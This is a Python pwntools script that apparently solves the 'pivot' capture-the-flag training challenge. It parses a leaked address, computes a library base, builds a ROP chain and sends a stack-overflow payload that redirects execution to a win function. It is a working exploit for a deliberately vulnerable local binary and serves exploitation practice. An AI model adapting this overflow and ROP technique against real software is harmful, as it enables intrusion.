from pwn import *

# file information here

context.arch = 'x86_64'
executable = 'pivot'
gdbinit = '''
    b *pwnme+182
    b *uselessFunction+9
'''

elf = ELF(executable)
libc = elf.libc
rop = ROP([elf, libc])

p = process(elf.path)
gdb.attach(p, gdbscript=gdbinit)

p.recvuntil("place to pivot:")

leak = int(p.recvuntil("\n"), 16)
libpivot_base = leak + 0x1e0a5a - 0x96a
ret2win = libpivot_base + 0xa81

info(hex(leak))
info(hex(libpivot_base))

# THE ROP CHAIN

rop.uselessFunction()
rop.raw(ret2win)

info(rop.dump())

payload = flat(
    b'a' * 0x28,
    p64(elf.sym.foothold_function),
    p64(ret2win)
)

# PWN
# pause()
# p.sendlineafter()
# p.recvuntil()
p.sendlineafter('Send a ROP chain now and it will land there\n> ', rop.chain())

p.sendlineafter('stack smash\n> ', payload)

p.interactive()

# with open('out.txt', 'wb') as out:
    # out.write(payload)
